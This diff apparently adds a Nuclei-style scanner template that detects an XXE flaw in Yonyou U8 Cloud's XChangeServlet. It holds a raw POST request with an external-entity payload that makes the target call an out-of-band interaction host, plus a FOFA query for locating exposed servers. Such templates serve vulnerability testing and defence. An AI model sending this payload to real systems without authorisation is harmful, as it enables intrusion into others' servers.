@@ -1,0 +1,33 @@
+id: yonyou-u8-cloud-servlet-XChangeServlet-xxe
+
+info:
+  name: 用友 U8 Cloud XChangeServlet - xxe
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - 
+  metadata:
+    verified: true
+    fofa-query: app="用友-U8-Cloud" || title=="U8C"
+  tags: yonyou,u8cloud,xxe,oa,oob
+
+http:
+  - raw:
+      - |
+        POST /servlet/XChangeServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows 98; Win 9x 4.90; Trident/5.1)
+        Connection: close
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/"> %remote;]>'
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
